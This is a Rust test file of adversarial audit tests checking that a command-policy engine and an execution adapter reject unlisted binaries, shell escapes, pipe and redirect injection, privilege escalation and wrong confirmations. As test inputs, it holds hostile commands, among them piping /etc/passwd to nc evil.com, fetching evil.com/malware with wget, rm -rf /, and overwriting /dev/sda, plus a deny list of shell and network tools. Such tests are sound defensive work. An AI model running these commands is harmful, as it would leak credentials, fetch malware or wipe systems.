//! Adversarial Audit Tests (Phase 49)
//!
//! These tests attempt to bypass Anna's security boundaries and prove
//! that bypass is impossible without modifying guarded files.
//!
//! The goal is NOT to find vulnerabilities but to PROVE their absence.

#[cfg(test)]
mod adversarial_tests {
    use crate::capabilities::all_allowed_binaries;
    use crate::command_policy::{
        authorize_command, CommandPolicyDecision, CommandSpec, DenialReason, PolicyContext,
    };
    use crate::declaration::CapabilityDeclaration;
    use crate::execution_request::{ExecutionRequest, AUTOMATIC_EXECUTION_CONFIRMATION};
    use crate::human_execution::{ExecutionError, HumanExecutionAdapter, ALLOWED_BINARIES};

    fn ctx() -> PolicyContext {
        PolicyContext::default()
    }

    // =========================================================================
    // BYPASS ATTEMPT 1: Try to authorize commands not in ledger
    // =========================================================================

    #[test]
    fn cannot_escalate_without_capability_change_arbitrary_binary() {
        // Attempt: Try to get policy to authorize an arbitrary binary
        let attack_binaries = [
            "wget",
            "curl",
            "nc",
            "python",
            "perl",
            "ruby",
            "node",
            "php",
            "lua",
            "awk",
            "sed",
            "grep",  // Even grep isn't allowed!
            "find",
            "xargs",
            "tee",
            "nohup",
            "screen",
            "tmux",
            "/bin/sh",
            "/bin/bash",
            "/usr/bin/env",
            "../../../bin/sh", // Path traversal attempt
        ];

        for binary in &attack_binaries {
            let cmd = CommandSpec::new(*binary, vec![]);
            let decision = authorize_command(&cmd, &ctx());

            assert!(
                matches!(decision, CommandPolicyDecision::Denied { .. }),
                "SECURITY: Binary '{}' should be denied but was allowed!",
                binary
            );
        }
    }

    #[test]
    fn cannot_escalate_without_capability_change_shell_escapes() {
        // Attempt: Try various shell escape techniques
        let shell_escapes = [
            // Direct shell invocation
            ("sh", vec!["-c", "whoami"]),
            ("bash", vec!["-c", "id"]),
            ("zsh", vec!["-c", "cat /etc/passwd"]),
            // Backtick injection (as argument)
            ("echo", vec!["`whoami`"]),
            // $() substitution
            ("echo", vec!["$(id)"]),
            // Nested substitution
            ("echo", vec!["$($(whoami))"]),
            // Variable expansion
            ("echo", vec!["${PATH}"]),
            // Brace expansion
            ("echo", vec!["{a,b,c}"]),
        ];

        for (binary, args) in &shell_escapes {
            let args_owned: Vec<String> = args.iter().map(|s| s.to_string()).collect();
            let cmd = CommandSpec::new(*binary, args_owned);
            let decision = authorize_command(&cmd, &ctx());

            // Shell invocation or substitution must be denied
            let is_shell_or_substitution = matches!(
                &decision,
                CommandPolicyDecision::Denied { reason }
                    if matches!(
                        reason,
                        DenialReason::ShellInvocation(_)
                            | DenialReason::CommandSubstitution
                            | DenialReason::BinaryNotInLedger(_)
                    )
            );

            assert!(
                is_shell_or_substitution,
                "SECURITY: Shell escape '{}' with args {:?} should be denied!",
                binary,
                args
            );
        }
    }

    #[test]
    fn cannot_escalate_without_capability_change_pipe_injection() {
        // Attempt: Try to inject pipes into allowed commands
        let pipe_attacks = [
            ("cat", vec!["/etc/passwd", "|", "nc", "evil.com", "1234"]),
            ("echo", vec!["test", "|", "bash"]),
            ("lsmod", vec!["|", "grep", "wifi"]),
            ("iw", vec!["dev", "|", "sh"]),
        ];

        for (binary, args) in &pipe_attacks {
            let args_owned: Vec<String> = args.iter().map(|s| s.to_string()).collect();
            let cmd = CommandSpec::new(*binary, args_owned);
            let decision = authorize_command(&cmd, &ctx());

            assert!(
                matches!(
                    decision,
                    CommandPolicyDecision::Denied {
                        reason: DenialReason::PipeDetected
                    }
                ),
                "SECURITY: Pipe injection in '{}' should be denied!",
                binary
            );
        }
    }

    #[test]
    fn cannot_escalate_without_capability_change_redirect_injection() {
        // Attempt: Try to inject redirects into allowed commands
        let redirect_attacks = [
            ("echo", vec!["malicious", ">", "/etc/passwd"]),
            ("echo", vec!["data", ">>", "/root/.bashrc"]),
            ("cat", vec!["/dev/zero", ">", "/dev/sda"]),
            ("lsmod", vec![">", "/tmp/exfil"]),
        ];

        for (binary, args) in &redirect_attacks {
            let args_owned: Vec<String> = args.iter().map(|s| s.to_string()).collect();
            let cmd = CommandSpec::new(*binary, args_owned);
            let decision = authorize_command(&cmd, &ctx());

            assert!(
                matches!(
                    decision,
                    CommandPolicyDecision::Denied {
                        reason: DenialReason::RedirectDetected
                    }
                ),
                "SECURITY: Redirect injection in '{}' should be denied!",
                binary
            );
        }
    }

    #[test]
    fn cannot_escalate_without_capability_change_privilege_escalation() {
        // Attempt: All known privilege escalation techniques
        let priv_esc_attacks = [
            ("sudo", vec!["cat", "/etc/shadow"]),
            ("su", vec!["-", "root"]),
            ("pkexec", vec!["cat", "/etc/shadow"]),
            ("doas", vec!["id"]),
            ("runuser", vec!["-u", "root", "whoami"]),
            ("dzdo", vec!["bash"]),
            // Via allowed binary
            ("echo", vec!["sudo", "id"]),
            ("cat", vec!["| sudo", "sh"]),
        ];

        for (binary, args) in &priv_esc_attacks {
            let args_owned: Vec<String> = args.iter().map(|s| s.to_string()).collect();
            let cmd = CommandSpec::new(*binary, args_owned);
            let decision = authorize_command(&cmd, &ctx());

            assert!(
                matches!(decision, CommandPolicyDecision::Denied { .. }),
                "SECURITY: Privilege escalation '{}' should be denied!",
                binary
            );
        }
    }

    // =========================================================================
    // BYPASS ATTEMPT 2: Try to bypass confirmation requirement
    // =========================================================================

    #[test]
    fn cannot_escalate_without_capability_change_wrong_confirmation() {
        let adapter = HumanExecutionAdapter::new("attacker");

        // Create request with wrong confirmation
        let mut request = ExecutionRequest::new_for_test("req-001", "attacker");
        request.confirmation_text = "I agree to execute".to_string(); // Wrong!

        let result = adapter.execute(&request, "echo test");

        assert!(
            matches!(
                result,
                Err(ExecutionError::InvalidRequest(_)) | Err(ExecutionError::ConfirmationMismatch)
            ),
            "SECURITY: Wrong confirmation should be rejected!"
        );
    }

    #[test]
    fn cannot_escalate_without_capability_change_empty_confirmation() {
        let adapter = HumanExecutionAdapter::new("attacker");

        let mut request = ExecutionRequest::new_for_test("req-002", "attacker");
        request.confirmation_text = "".to_string();

        let result = adapter.execute(&request, "echo test");

        assert!(
            matches!(
                result,
                Err(ExecutionError::InvalidRequest(_)) | Err(ExecutionError::ConfirmationMismatch)
            ),
            "SECURITY: Empty confirmation should be rejected!"
        );
    }

    #[test]
    fn cannot_escalate_without_capability_change_partial_confirmation() {
        let adapter = HumanExecutionAdapter::new("attacker");

        // Try partial matches of the real confirmation
        let partial_confirmations = [
            "I understand",
            "this will execute",
            "automatically",
            "I understand this will",
            "understand this will execute automatically",
        ];

        for partial in &partial_confirmations {
            let mut request = ExecutionRequest::new_for_test("req-003", "attacker");
            request.confirmation_text = partial.to_string();

            let result = adapter.execute(&request, "echo test");

            assert!(
                matches!(
                    result,
                    Err(ExecutionError::InvalidRequest(_)) | Err(ExecutionError::ConfirmationMismatch)
                ),
                "SECURITY: Partial confirmation '{}' should be rejected!",
                partial
            );
        }
    }

    // =========================================================================
    // BYPASS ATTEMPT 3: Try to execute through adapter with forbidden binary
    // =========================================================================

    #[test]
    fn cannot_escalate_without_capability_change_adapter_forbidden_binary() {
        let adapter = HumanExecutionAdapter::new("attacker");
        let request = valid_auto_request();

        // Try executing forbidden binaries through the adapter
        let forbidden = ["wget", "curl", "sudo", "rm", "dd", "bash", "sh"];

        for binary in &forbidden {
            let command = format!("{} --version", binary);
            let result = adapter.execute(&request, &command);

            assert!(
                result.is_err(),
                "SECURITY: Forbidden binary '{}' should be rejected by adapter!",
                binary
            );
        }
    }

    #[test]
    fn cannot_escalate_without_capability_change_adapter_command_injection() {
        let adapter = HumanExecutionAdapter::new("attacker");
        let request = valid_auto_request();

        // Try command injection through the adapter
        let injections = [
            "echo test; rm -rf /",
            "cat /etc/passwd && sudo su",
            "lsmod || wget evil.com/malware",
            "iw dev; bash -i",
        ];

        for injection in &injections {
            let result = adapter.execute(&request, injection);

            assert!(
                result.is_err(),
                "SECURITY: Command injection '{}' should be rejected by adapter!",
                injection
            );
        }
    }

    // =========================================================================
    // BYPASS ATTEMPT 4: Try to find inconsistencies between layers
    // =========================================================================

    #[test]
    fn cannot_escalate_without_capability_change_policy_adapter_mismatch() {
        // Verify that everything the adapter allows, the policy also allows
        // And nothing the policy denies can reach the adapter

        let adapter = HumanExecutionAdapter::new("tester");
        let request = valid_auto_request();

        // For each allowed binary, verify policy agrees
        for binary in ALLOWED_BINARIES {
            let cmd = CommandSpec::new(*binary, vec![]);
            let policy_decision = authorize_command(&cmd, &ctx());

            assert!(
                matches!(policy_decision, CommandPolicyDecision::Allowed { .. }),
                "SECURITY: Adapter allows '{}' but policy denies it!",
                binary
            );
        }

        // For each ledger binary, verify adapter allows it
        let ledger_binaries = all_allowed_binaries();
        for binary in &ledger_binaries {
            let command = binary.to_string();
            // This might fail for other reasons (command not found), but should NOT
            // fail with BinaryNotAllowed
            let result = adapter.execute(&request, &command);

            if let Err(ExecutionError::BinaryNotAllowed(b)) = &result {
                panic!(
                    "SECURITY: Ledger allows '{}' but adapter rejects it as BinaryNotAllowed!",
                    b
                );
            }
        }
    }

    #[test]
    fn cannot_escalate_without_capability_change_declaration_policy_mismatch() {
        // Verify that what declaration shows matches what policy enforces
        let decl = CapabilityDeclaration::from_ledger();

        // Every "will never do" item should be denied by policy
        for entry in &decl.will_never_do {
            // Try a representative command for each forbidden capability
            let test_cmd = match entry.name.to_lowercase().as_str() {
                n if n.contains("network") => Some(("wget", vec!["http://example.com"])),
                n if n.contains("package") => Some(("pacman", vec!["-S", "evil"])),
                n if n.contains("sudo") => Some(("sudo", vec!["id"])),
                n if n.contains("destructive") => Some(("rm", vec!["-rf", "/"])),
                _ => None,
            };

            if let Some((binary, args)) = test_cmd {
                let args_owned: Vec<String> = args.iter().map(|s| s.to_string()).collect();
                let cmd = CommandSpec::new(binary, args_owned);
                let decision = authorize_command(&cmd, &ctx());

                assert!(
                    matches!(decision, CommandPolicyDecision::Denied { .. }),
                    "SECURITY: Declaration says '{}' is forbidden but policy allows it!",
                    entry.name
                );
            }
        }
    }

    // =========================================================================
    // BYPASS ATTEMPT 5: Try to modify behavior without touching guarded files
    // =========================================================================

    #[test]
    fn cannot_escalate_without_capability_change_static_analysis() {
        // This test documents the guarded files
        // Any attempt to add execution power MUST modify one of these files
        let guarded_files = [
            "capabilities.rs",     // Capability ledger - source of truth
            "command_policy.rs",   // Authorization engine
            "human_execution.rs",  // Execution adapter
        ];

        // Document the invariant
        assert_eq!(
            guarded_files.len(),
            3,
            "There should be exactly 3 guarded files"
        );

        // The constitutional rule is: changes to these files require PHASES.md update
        // This is enforced by CI, not by code

        // Verify no other files can grant execution power
        // (This is a documentation assertion, not a runtime check)
        let cannot_grant_power = [
            "declaration.rs",      // Read-only view, no execution
            "execution_request.rs", // Just data structures
            "action_plan.rs",      // Just data structures
        ];

        // If this test needs to change, the architecture has drifted
        assert_eq!(
            cannot_grant_power.len(),
            3,
            "There should be exactly 3 non-guarded capability-adjacent files"
        );
    }

    // =========================================================================
    // HELPER FUNCTIONS
    // =========================================================================

    fn valid_auto_request() -> ExecutionRequest {
        let mut req = ExecutionRequest::new_for_test("auto-req-001", "tester");
        req.confirmation_text = AUTOMATIC_EXECUTION_CONFIRMATION.to_string();
        req
    }
}
